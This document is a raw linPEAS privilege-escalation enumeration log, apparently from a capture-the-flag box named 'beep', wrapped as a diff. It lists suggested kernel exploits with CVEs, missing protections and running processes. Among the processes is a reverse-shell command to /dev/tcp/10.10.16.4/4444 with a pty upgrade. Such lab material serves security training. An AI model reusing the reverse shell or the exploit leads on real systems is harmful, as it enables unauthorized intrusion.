@@ -1,0 +1,1345 @@
+./linpeas.sh
+
+
+                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+    /---------------------------------------------------------------------------\
+    |                             Do you like PEASS?                            |
+    |---------------------------------------------------------------------------| 
+    |         Become a Patreon    :     https://www.patreon.com/peass           |
+    |         Follow on Twitter   :     @carlospolopm                           |
+    |         Respect on HTB      :     SirBroccoli                             |
+    |---------------------------------------------------------------------------|
+    |                                 Thank you!                                |
+    \---------------------------------------------------------------------------/
+          linpeas-ng by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look to it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMagenta: Your username
+
+ Starting linpeas. Caching Writable Folders...
+
+                                         ╔═══════════════════╗
+═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════
+                                         ╚═══════════════════╝
+OS: Linux version 2.6.18-238.12.1.el5 (mockbuild@builder10.centos.org) (gcc version 4.1.2 20080704 (Red Hat 4.1.2-50)) #1 SMP Tue May 31 13:23:01 EDT 2011
+User & Groups: uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
+Hostname: beep
+Writable folder: /dev/shm
+[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+[+] nmap is available for network discover & port scanning, you should use it yourself                                                                                                                                                                                                                                      
+                                                                                                                                                                                                                                                                                                                            
+
+Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
+                                                                                                                                                                                                                                                                                                                            
+                                        ╔════════════════════╗
+════════════════════════════════════════╣ System Information ╠════════════════════════════════════════                                                                                                                                                                                                                      
+                                        ╚════════════════════╝                                                                                                                                                                                                                                                              
+╔══════════╣ Operative system
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                                                                                                                                                                               
+Linux version 2.6.18-238.12.1.el5 (mockbuild@builder10.centos.org) (gcc version 4.1.2 20080704 (Red Hat 4.1.2-50)) #1 SMP Tue May 31 13:23:01 EDT 2011                                                                                                                                                                      
+lsb_release Not Found
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Sudo version
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                                                                                                                                                                                  
+Sudo version 1.7.2p1                                                                                                                                                                                                                                                                                                        
+
+./linpeas.sh: line 1187: systemctl: command not found
+
+╔══════════╣ PATH
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                                                                                                                                                                          
+/sbin:/usr/sbin:/bin:/usr/bin                                                                                                                                                                                                                                                                                               
+New path exported: /sbin:/usr/sbin:/bin:/usr/bin:/usr/local/sbin:/usr/local/bin
+
+╔══════════╣ Date & uptime
+Sat Dec 24 12:14:38 EET 2022                                                                                                                                                                                                                                                                                                
+ 12:14:38 up  1:26,  0 users,  load average: 1.94, 0.80, 0.55
+
+╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
+disk                                                                                                                                                                                                                                                                                                                        
+sda
+sda1
+sda2
+
+╔══════════╣ Unmounted file-system?
+╚ Check if you can mount umounted devices                                                                                                                                                                                                                                                                                   
+/dev/VolGroup00/LogVol00 /                       ext3    defaults        1 1                                                                                                                                                                                                                                                
+LABEL=/boot             /boot                   ext3    defaults        1 2
+tmpfs                   /dev/shm                tmpfs   defaults        0 0
+devpts                  /dev/pts                devpts  gid=5,mode=620  0 0
+sysfs                   /sys                    sysfs   defaults        0 0
+proc                    /proc                   proc    defaults        0 0
+/dev/VolGroup00/LogVol01 swap                    swap    defaults        0 0
+
+╔══════════╣ Environment
+╚ Any private information inside environment variables?                                                                                                                                                                                                                                                                     
+SELINUX_INIT=YES                                                                                                                                                                                                                                                                                                            
+CONSOLE=/dev/console
+TERM=linux
+HISTSIZE=0
+HISTFILESIZE=0
+INIT_VERSION=sysvinit-2.86
+RPORT=4444
+PATH=/sbin:/usr/sbin:/bin:/usr/bin:/usr/local/sbin:/usr/local/bin
+RUNLEVEL=3
+runlevel=3
+RHOST=10.10.16.4
+PWD=/tmp
+LANG=C
+PREVLEVEL=N
+previous=N
+HOME=/
+SHLVL=6
+HISTFILE=/dev/null
+_=/bin/env
+
+╔══════════╣ Searching Signature verification failed in dmesg
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                                                                                                                                                                                                                           
+dmesg Not Found                                                                                                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                                                                                                          
+bash: line 81: cannot create temp file for here document: Read-only file system                                                                                                                                                                                                                                             
+bash: line 92: cannot create temp file for here document: Read-only file system
+bash: line 101: cannot create temp file for here document: Read-only file system
+bash: line 110: cannot create temp file for here document: Read-only file system
+bash: line 119: cannot create temp file for here document: Read-only file system
+bash: line 128: cannot create temp file for here document: Read-only file system
+sed: -e expression #1, char 27: unknown option to `s'
+bash: line 137: cannot create temp file for here document: Read-only file system
+bash: line 146: cannot create temp file for here document: Read-only file system
+bash: line 155: cannot create temp file for here document: Read-only file system
+bash: line 165: cannot create temp file for here document: Read-only file system
+bash: line 174: cannot create temp file for here document: Read-only file system
+bash: line 183: cannot create temp file for here document: Read-only file system
+bash: line 193: cannot create temp file for here document: Read-only file system
+bash: line 202: cannot create temp file for here document: Read-only file system
+bash: line 212: cannot create temp file for here document: Read-only file system
+bash: line 224: cannot create temp file for here document: Read-only file system
+bash: line 235: cannot create temp file for here document: Read-only file system
+bash: line 246: cannot create temp file for here document: Read-only file system
+bash: line 256: cannot create temp file for here document: Read-only file system
+bash: line 269: cannot create temp file for here document: Read-only file system
+bash: line 281: cannot create temp file for here document: Read-only file system
+bash: line 293: cannot create temp file for here document: Read-only file system
+bash: line 305: cannot create temp file for here document: Read-only file system
+bash: line 314: cannot create temp file for here document: Read-only file system
+bash: line 323: cannot create temp file for here document: Read-only file system
+bash: line 332: cannot create temp file for here document: Read-only file system
+bash: line 344: cannot create temp file for here document: Read-only file system
+bash: line 356: cannot create temp file for here document: Read-only file system
+bash: line 366: cannot create temp file for here document: Read-only file system
+bash: line 379: cannot create temp file for here document: Read-only file system
+bash: line 389: cannot create temp file for here document: Read-only file system
+bash: line 398: cannot create temp file for here document: Read-only file system
+bash: line 407: cannot create temp file for here document: Read-only file system
+bash: line 416: cannot create temp file for here document: Read-only file system
+bash: line 425: cannot create temp file for here document: Read-only file system
+bash: line 434: cannot create temp file for here document: Read-only file system
+bash: line 447: cannot create temp file for here document: Read-only file system
+bash: line 459: cannot create temp file for here document: Read-only file system
+bash: line 472: cannot create temp file for here document: Read-only file system
+bash: line 486: cannot create temp file for here document: Read-only file system
+bash: line 499: cannot create temp file for here document: Read-only file system
+bash: line 508: cannot create temp file for here document: Read-only file system
+bash: line 518: cannot create temp file for here document: Read-only file system
+bash: line 528: cannot create temp file for here document: Read-only file system
+bash: line 540: cannot create temp file for here document: Read-only file system
+bash: line 551: cannot create temp file for here document: Read-only file system
+bash: line 561: cannot create temp file for here document: Read-only file system
+bash: line 571: cannot create temp file for here document: Read-only file system
+bash: line 581: cannot create temp file for here document: Read-only file system
+bash: line 591: cannot create temp file for here document: Read-only file system
+bash: line 601: cannot create temp file for here document: Read-only file system
+bash: line 610: cannot create temp file for here document: Read-only file system
+bash: line 622: cannot create temp file for here document: Read-only file system
+bash: line 632: cannot create temp file for here document: Read-only file system
+bash: line 641: cannot create temp file for here document: Read-only file system
+bash: line 653: cannot create temp file for here document: Read-only file system
+bash: line 663: cannot create temp file for here document: Read-only file system
+bash: line 673: cannot create temp file for here document: Read-only file system
+bash: line 684: cannot create temp file for here document: Read-only file system
+bash: line 697: cannot create temp file for here document: Read-only file system
+bash: line 709: cannot create temp file for here document: Read-only file system
+bash: line 722: cannot create temp file for here document: Read-only file system
+bash: line 734: cannot create temp file for here document: Read-only file system
+bash: line 747: cannot create temp file for here document: Read-only file system
+bash: line 760: cannot create temp file for here document: Read-only file system
+bash: line 773: cannot create temp file for here document: Read-only file system
+bash: line 785: cannot create temp file for here document: Read-only file system
+base64: invalid input
+bash: line 800: cannot create temp file for here document: Read-only file system
+bash: line 813: cannot create temp file for here document: Read-only file system
+bash: line 828: cannot create temp file for here document: Read-only file system
+bash: line 841: cannot create temp file for here document: Read-only file system
+bash: line 853: cannot create temp file for here document: Read-only file system
+bash: line 866: cannot create temp file for here document: Read-only file system
+bash: line 881: cannot create temp file for here document: Read-only file system
+bash: line 893: cannot create temp file for here document: Read-only file system
+bash: line 905: cannot create temp file for here document: Read-only file system
+bash: line 917: cannot create temp file for here document: Read-only file system
+bash: line 931: cannot create temp file for here document: Read-only file system
+bash: line 943: cannot create temp file for here document: Read-only file system
+bash: line 953: cannot create temp file for here document: Read-only file system
+bash: line 963: cannot create temp file for here document: Read-only file system
+bash: line 973: cannot create temp file for here document: Read-only file system
+bash: line 983: cannot create temp file for here document: Read-only file system
+bash: line 992: cannot create temp file for here document: Read-only file system
+bash: line 1002: cannot create temp file for here document: Read-only file system
+bash: line 1012: cannot create temp file for here document: Read-only file system
+bash: line 1023: cannot create temp file for here document: Read-only file system
+bash: line 1034: cannot create temp file for here document: Read-only file system
+bash: line 1045: cannot create temp file for here document: Read-only file system
+bash: line 1057: cannot create temp file for here document: Read-only file system
+bash: line 1068: cannot create temp file for here document: Read-only file system
+bash: line 1078: cannot create temp file for here document: Read-only file system
+bash: line 1089: cannot create temp file for here document: Read-only file system
+bash: line 1098: cannot create temp file for here document: Read-only file system
+bash: line 1109: cannot create temp file for here document: Read-only file system
+bash: line 1121: cannot create temp file for here document: Read-only file system
+bash: line 1133: cannot create temp file for here document: Read-only file system
+bash: line 1145: cannot create temp file for here document: Read-only file system
+bash: line 1158: cannot create temp file for here document: Read-only file system
+bash: line 1171: cannot create temp file for here document: Read-only file system
+bash: line 1181: cannot create temp file for here document: Read-only file system
+bash: line 1191: cannot create temp file for here document: Read-only file system
+bash: line 1202: cannot create temp file for here document: Read-only file system
+bash: line 1215: cannot create temp file for here document: Read-only file system
+bash: line 1228: cannot create temp file for here document: Read-only file system
+bash: line 1241: cannot create temp file for here document: Read-only file system
+bash: line 1254: cannot create temp file for here document: Read-only file system
+bash: line 1267: cannot create temp file for here document: Read-only file system
+bash: line 1280: cannot create temp file for here document: Read-only file system
+bash: line 1293: cannot create temp file for here document: Read-only file system
+bash: line 1306: cannot create temp file for here document: Read-only file system
+bash: line 1319: cannot create temp file for here document: Read-only file system
+bash: line 1332: cannot create temp file for here document: Read-only file system
+bash: line 1345: cannot create temp file for here document: Read-only file system
+bash: line 1359: cannot create temp file for here document: Read-only file system
+bash: line 1372: cannot create temp file for here document: Read-only file system
+bash: line 1384: cannot create temp file for here document: Read-only file system
+bash: line 1398: cannot create temp file for here document: Read-only file system
+bash: line 1409: cannot create temp file for here document: Read-only file system
+bash: line 1423: cannot create temp file for here document: Read-only file system
+bash: line 1434: cannot create temp file for here document: Read-only file system
+bash: line 1446: cannot create temp file for here document: Read-only file system
+bash: line 1459: cannot create temp file for here document: Read-only file system
+bash: line 1470: cannot create temp file for here document: Read-only file system
+bash: line 1481: cannot create temp file for here document: Read-only file system
+bash: line 1491: cannot create temp file for here document: Read-only file system
+bash: line 1502: cannot create temp file for here document: Read-only file system
+bash: line 1512: cannot create temp file for here document: Read-only file system
+bash: line 1520: cannot create temp file for here document: Read-only file system
+bash: line 1527: cannot create temp file for here document: Read-only file system
+bash: line 1534: cannot create temp file for here document: Read-only file system
+bash: line 1542: cannot create temp file for here document: Read-only file system
+bash: line 1550: cannot create temp file for here document: Read-only file system
+bash: line 1558: cannot create temp file for here document: Read-only file system
+bash: line 1565: cannot create temp file for here document: Read-only file system
+bash: line 1572: cannot create temp file for here document: Read-only file system
+bash: line 1579: cannot create temp file for here document: Read-only file system
+bash: line 1586: cannot create temp file for here document: Read-only file system
+bash: line 1593: cannot create temp file for here document: Read-only file system
+bash: line 1600: cannot create temp file for here document: Read-only file system
+bash: line 1607: cannot create temp file for here document: Read-only file system
+bash: line 1614: cannot create temp file for here document: Read-only file system
+bash: line 1621: cannot create temp file for here document: Read-only file system
+bash: line 1628: cannot create temp file for here document: Read-only file system
+bash: line 1635: cannot create temp file for here document: Read-only file system
+bash: line 1642: cannot create temp file for here document: Read-only file system
+bash: line 1649: cannot create temp file for here document: Read-only file system
+bash: line 1656: cannot create temp file for here document: Read-only file system
+bash: line 1663: cannot create temp file for here document: Read-only file system
+bash: line 1671: cannot create temp file for here document: Read-only file system
+bash: line 1678: cannot create temp file for here document: Read-only file system
+bash: line 1685: cannot create temp file for here document: Read-only file system
+bash: line 1692: cannot create temp file for here document: Read-only file system
+bash: line 1699: cannot create temp file for here document: Read-only file system
+bash: line 1704: cannot create temp file for here document: Read-only file system
+bash: line 1712: cannot create temp file for here document: Read-only file system
+bash: line 1720: cannot create temp file for here document: Read-only file system
+bash: line 1725: cannot create temp file for here document: Read-only file system
+bash: line 1732: cannot create temp file for here document: Read-only file system
+bash: line 1739: cannot create temp file for here document: Read-only file system
+bash: line 1746: cannot create temp file for here document: Read-only file system
+bash: line 1751: cannot create temp file for here document: Read-only file system
+bash: line 1759: cannot create temp file for here document: Read-only file system
+bash: line 1767: cannot create temp file for here document: Read-only file system
+bash: line 1775: cannot create temp file for here document: Read-only file system
+bash: line 1782: cannot create temp file for here document: Read-only file system
+bash: line 1789: cannot create temp file for here document: Read-only file system
+Script needs Bash in version 4.0 or newer. Aborting.
+
+╔══════════╣ Executing Linux Exploit Suggester 2
+╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                                                                                                                                                     
+base64: invalid input                                                                                                                                                                                                                                                                                                       
+  [1] american-sign-language
+      CVE-2010-4347
+      Source: http://www.securityfocus.com/bid/45408
+  [2] can_bcm
+      CVE-2010-2959
+      Source: http://www.exploit-db.com/exploits/14814
+  [3] do_pages_move
+      Alt: sieve       CVE-2010-0415
+      Source: Spenders Enlightenment
+  [4] ftrex
+      CVE-2008-4210
+      Source: http://www.exploit-db.com/exploits/6851
+  [5] half_nelson1
+      Alt: econet       CVE-2010-3848
+      Source: http://www.exploit-db.com/exploits/17787
+  [6] half_nelson2
+      Alt: econet       CVE-2010-3850
+      Source: http://www.exploit-db.com/exploits/17787
+  [7] half_nelson3
+      Alt: econet       CVE-2010-4073
+      Source: http://www.exploit-db.com/exploits/17787
+  [8] msr
+      CVE-2013-0268
+      Source: http://www.exploit-db.com/exploits/27297
+  [9] pipe.c_32bit
+      CVE-2009-3547
+      Source: http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c
+  [10] pktcdvd
+      CVE-2010-3437
+      Source: http://www.exploit-db.com/exploits/15150
+  [11] reiserfs
+      CVE-2010-1146
+      Source: http://www.exploit-db.com/exploits/12130
+  [12] sock_sendpage
+      Alt: wunderbar_emporium       CVE-2009-2692
+      Source: http://www.exploit-db.com/exploits/9435
+  [13] sock_sendpage2
+      Alt: proto_ops       CVE-2009-2692
+      Source: http://www.exploit-db.com/exploits/9436
+  [14] udp_sendmsg_32bit
+      CVE-2009-2698
+      Source: http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c
+  [15] video4linux
+      CVE-2010-3081
+      Source: http://www.exploit-db.com/exploits/15024
+  [16] vmsplice1
+      Alt: jessica biel       CVE-2008-0600
+      Source: http://www.exploit-db.com/exploits/5092
+
+
+╔══════════╣ Protections
+═╣ AppArmor enabled? .............. AppArmor Not Found                                                                                                                                                                                                                                                                      
+═╣ grsecurity present? ............ grsecurity Not Found                                                                                                                                                                                                                                                                    
+═╣ PaX bins present? .............. PaX Not Found                                                                                                                                                                                                                                                                           
+═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                                                                                                                                                    
+═╣ SELinux enabled? ............... SELinux status:                 disabled                                                                                                                                                                                                                                                
+═╣ Is ASLR enabled? ............... Yes
+═╣ Printer? ....................... No
+═╣ Is this a virtual machine? ..... No                                                                                                                                                                                                                                                                                      
+
+                                             ╔═══════════╗
+═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════                                                                                                                                                                                                                     
+                                             ╚═══════════╝                                                                                                                                                                                                                                                                  
+╔══════════╣ Container related tools present
+╔══════════╣ Container details                                                                                                                                                                                                                                                                                              
+═╣ Is this a container? ........... No                                                                                                                                                                                                                                                                                      
+═╣ Any running containers? ........ No                                                                                                                                                                                                                                                                                      
+                                                                                                                                                                                                                                                                                                                            
+
+                          ╔════════════════════════════════════════════════╗
+══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════                                                                                                                                                                                                                      
+                          ╚════════════════════════════════════════════════╝                                                                                                                                                                                                                                                
+╔══════════╣ Cleaned processes
+╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                                                                                                                      
+root       574  0.0  0.0   2396   688 ?        S<s  10:48   0:00 /sbin/udevd -d                                                                                                                                                                                                                                             
+root      2314  0.0  0.6  25312  6472 ?        Sl   10:48   0:00 /usr/sbin/vmtoolsd
+root      2348  0.0  0.8  16124  8348 ?        S    10:48   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
+root      2461  0.0  0.0  22456   528 ?        Ssl  10:48   0:00 brcm_iscsiuio
+root      2466  0.0  0.0   3728   532 ?        Ss   10:48   0:00 iscsid
+root      2467  0.0  0.4   4184  4180 ?        S<Ls 10:48   0:00 iscsid
+root      2714  0.0  0.0  12636   788 ?        S<sl 10:48   0:00 auditd
+root      2716  0.0  0.0  12172   688 ?        S<sl 10:48   0:00  _ /sbin/audispd
+root      2746  0.0  0.0   1828   640 ?        Ss   10:48   0:00 syslogd -m 0
+root      2749  0.0  0.0   1776   384 ?        Ss   10:48   0:00 klogd -x
+rpc       2780  0.0  0.0   1924   620 ?        Ss   10:48   0:00 portmap
+root      2816  0.0  0.0   1976   776 ?        Ss   10:48   0:00 rpc.statd
+root      2848  0.0  0.0   5964   616 ?        Ss   10:48   0:00 rpc.idmapd
+dbus      2874  0.0  0.0   2860   848 ?        Ss   10:48   0:00 dbus-daemon --system
+root      2910  0.0  0.0   1772   528 ?        Ss   10:48   0:00 /usr/sbin/acpid
+68        2995  0.0  0.4   6252  4328 ?        Ss   10:48   0:00 hald
+root      2996  0.0  0.1   3272  1112 ?        S    10:48   0:00  _ hald-runner
+68        3003  0.0  0.0   2120   828 ?        S    10:48   0:00      _ hald-addon-acpi: listening on acpid socket /var/run/acpid.socket
+68        3007  0.0  0.0   2120   824 ?        S    10:48   0:00      _ hald-addon-keyboard: listening on /dev/input/event0
+root      3019  0.0  0.0   2072   684 ?        S    10:48   0:02      _ hald-addon-storage: polling /dev/hdc
+root      3056  0.0  0.1   7236  1048 ?        Ss   10:48   0:00 /usr/sbin/sshd
+root      3075  0.0  0.0   2848   876 ?        Ss   10:48   0:00 xinetd -stayalive -pidfile /var/run/xinetd.pid
+ntp       3091  0.0  0.4   4540  4536 ?        SLs  10:48   0:00 ntpd -u ntp:ntp -p /var/run/ntpd.pid -g
+root      3130  0.0  0.1   4636  1280 ?        S    10:48   0:00 /bin/sh /usr/bin/mysqld_safe --datadir=/var/lib/mysql --socket=/var/lib/mysql/mysql.sock --log-error=/var/log/mysqld.log --pid-file=/var/run/mysqld/mysqld.pid --user=mysql
+mysql     3180  0.0  2.5 144584 26420 ?        Sl   10:48   0:00  _ /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --socket=/var/lib/mysql/mysql.sock
+cyrus     3309  0.0  0.3  17968  3144 ?        Ss   10:48   0:00 /usr/lib/cyrus-imapd/cyrus-master -d
+cyrus     3372  0.0  0.2  31448  2420 ?        S    10:48   0:00  _ lmtpd
+cyrus    30981  0.0  0.2  31352  2148 ?        S    11:13   0:00  _ pop3d
+cyrus    30987  0.0  0.2  31656  2184 ?        S    11:14   0:00  _ imapd
+cyrus    30988  0.0  0.2  31656  2184 ?        S    11:14   0:00  _ imapd
+cyrus    31505  0.0  0.2  31656  2184 ?        S    11:28   0:00  _ imapd
+cyrus    31549  0.0  0.2  31656  2184 ?        S    11:29   0:00  _ imapd
+cyrus    31630  0.0  0.2  31656  2196 ?        S    11:31   0:00  _ imapd -s
+cyrus    31739  0.0  0.2  31352  2152 ?        S    11:31   0:00  _ pop3d
+cyrus    31756  0.0  0.2  31352  2144 ?        S    11:32   0:00  _ pop3d -s
+cyrus    31758  0.0  0.2  31352  2144 ?        S    11:32   0:00  _ pop3d
+cyrus    31759  0.0  0.2  31656  2188 ?        S    11:32   0:00  _ imapd
+cyrus     3340  0.0  0.0  30156   472 ?        S    10:48   0:00 idled
+root      3473  0.0  0.1   6996  1768 ?        Ss   10:48   0:00 /usr/libexec/postfix/master
+postfix  31520  0.0  0.1   7060  1740 ?        S    11:28   0:00  _ pickup -l -t fifo -u
+postfix  31521  0.0  0.1   7120  1780 ?        S    11:28   0:00  _ qmgr -l -t fifo -u
+root      3489  0.0  0.8  26236  8500 ?        Ss   10:48   0:00 /usr/sbin/httpd
+asterisk  3598  0.1  2.7  47520 28684 ?        S    10:48   0:10  _ /usr/sbin/httpd
+asterisk  3599  0.2  2.8  48000 29708 ?        S    10:48   0:11  _ /usr/sbin/httpd
+asterisk  3600  0.3  2.5  45460 26568 ?        S    10:48   0:15  _ /usr/sbin/httpd
+asterisk  4138  0.3  2.5  45504 26552 ?        S    11:07   0:12  _ /usr/sbin/httpd
+asterisk  4139  0.2  2.7  44796 27976 ?        S    11:07   0:09  _ /usr/sbin/httpd
+asterisk  4142  0.2  2.9  46728 30064 ?        S    11:07   0:08  _ /usr/sbin/httpd
+asterisk  4146  0.1  2.6  44948 27648 ?        S    11:07   0:07  _ /usr/sbin/httpd
+asterisk  4152  0.2  2.6  44804 27656 ?        S    11:07   0:11  _ /usr/sbin/httpd
+asterisk  4156  0.1  2.5  43664 26232 ?        S    11:07   0:07  _ /usr/sbin/httpd
+asterisk  4162  0.2  2.8  48064 29540 ?        S    11:07   0:10  _ /usr/sbin/httpd
+asterisk 12408  0.0  0.1   2560  1248 pts/1    Ss   12:13   0:00  |           _ /bin/bash
+asterisk 12594  0.2  0.2   4260  2900 pts/1    S+   12:13   0:00  |               _ /bin/sh ./linpeas.sh
+asterisk 14519  0.0  0.2   4260  2172 pts/1    S+   12:14   0:00  |                   _ /bin/sh ./linpeas.sh
+asterisk 14520  0.0  0.0   2420   880 pts/1    R+   12:14   0:00  |                       _ ps fauxwww
+asterisk  4163  0.2  2.6  44388 27184 ?        S    11:07   0:10  _ /usr/sbin/httpd
+asterisk  4164  0.3  2.8  46116 29520 ?        S    11:07   0:14  _ /usr/sbin/httpd
+asterisk  4174  0.2  2.7  47540 28956 ?        S    11:07   0:10  _ /usr/sbin/httpd
+asterisk  4280  0.2  2.6  44512 27324 ?        S    11:07   0:10  _ /usr/sbin/httpd
+asterisk  4786  0.2  2.7  45156 28580 ?        S    11:07   0:10  _ /usr/sbin/httpd
+asterisk  4787  0.3  2.6  44964 27344 ?        S    11:07   0:14  _ /usr/sbin/httpd
+asterisk  5582  0.3  2.5  43152 26176 ?        S    11:07   0:12  _ /usr/sbin/httpd
+asterisk 11563  0.0  0.1   2556  1044 ?        S    12:12   0:00  |   _ sh -c bash -i >& /dev/tcp/10.10.16.4/4444 0>&1 2>&1
+asterisk 11564  0.0  0.1   2560  1244 ?        S    12:12   0:00  |       _ bash -i
+asterisk 11767  0.0  0.1   2560  1240 ?        S    12:12   0:00  |           _ /bin/bash -i
+asterisk 11932 58.4  0.2   4084  2356 ?        R    12:12   1:11  |               _ python -c import pty; pty.spawn("/bin/bash")
+asterisk 11933  0.0  0.1   2560  1252 pts/0    Ss+  12:12   0:00  |                   _ /bin/bash
+asterisk 12853  0.2  2.7  44924 28664 ?        S    11:07   0:08  _ /usr/sbin/httpd
+asterisk 26080  0.3  2.6  44572 27284 ?        S    11:08   0:13  _ /usr/sbin/httpd
+asterisk  4527  0.1  2.6  45548 27100 ?        S    11:43   0:01  _ /usr/sbin/httpd
+root      3520  0.0  0.0   4636   656 ?        S    10:48   0:00 /bin/sh /usr/sbin/safe_asterisk -U asterisk -G asterisk
+asterisk  3532  0.0  1.9  53912 20404 ?        Sl   10:48   0:00  _ /usr/sbin/asterisk -f -U asterisk -G asterisk -vvvg -c
+root      3546  0.0  0.1   5396  1120 ?        Ss   10:48   0:00 crond
+root      1336  0.0  0.1   5980  1536 ?        S    12:01   0:00  _ crond
+root      1346  0.0  0.1   7052  1720 ?        S    12:01   0:00  |   _ /usr/sbin/sendmail -FCronDaemon -i -odi -oem -oi -t
+root      1347  0.0  0.1   7024  1740 ?        S    12:01   0:00  |       _ /usr/sbin/postdrop -r
+asterisk  1844  0.0  0.1   5984  1540 ?        S    12:02   0:00  _ crond
+asterisk  1850  0.0  1.0  25196 11132 ?        Ss   12:02   0:00      _ /usr/bin/php -q /var/lib/asterisk/bin/freepbx-cron-scheduler.php
+asterisk  1853  0.0  0.1   7052  1720 ?        S    12:02   0:00      _ /usr/sbin/sendmail -FCronDaemon -i -odi -oem -oi -t
+asterisk  1854  0.0  0.1   7024  1736 ?        S    12:02   0:00          _ /usr/sbin/postdrop -r
+xfs       3572  0.0  0.1   3408  1116 ?        Ss   10:48   0:00 xfs -droppriv -daemon
+root      3601  0.0  0.3  24452  3960 ?        Ss   10:48   0:00 /usr/bin/php /opt/elastix/elastix-updater/elxupdaterd
+root      3628  0.0  0.3  24452  3720 ?        S    10:48   0:00  _ /usr/bin/php /opt/elastix/elastix-updater/elxupdaterd
+root      3615  0.0  0.0   2372   424 ?        Ss   10:48   0:00 /usr/sbin/atd
+uucp      3631  0.0  0.1   7024  1120 ?        Ss   10:48   0:00 /usr/sbin/faxq
+uucp      3634  0.0  0.0   4640   904 ?        Ss   10:48   0:00 /usr/sbin/hfaxd -i hylafax
+root      3662  0.0  0.0   5716   680 ?        Ss   10:48   0:00 /usr/sbin/saslauthd -m /var/run/saslauthd -a pam
+root      3663  0.0  0.0   5716   428 ?        S    10:48   0:00  _ /usr/sbin/saslauthd -m /var/run/saslauthd -a pam
+root      3664  0.0  0.0   5716   416 ?        S    10:48   0:00  _ /usr/sbin/saslauthd -m /var/run/saslauthd -a pam
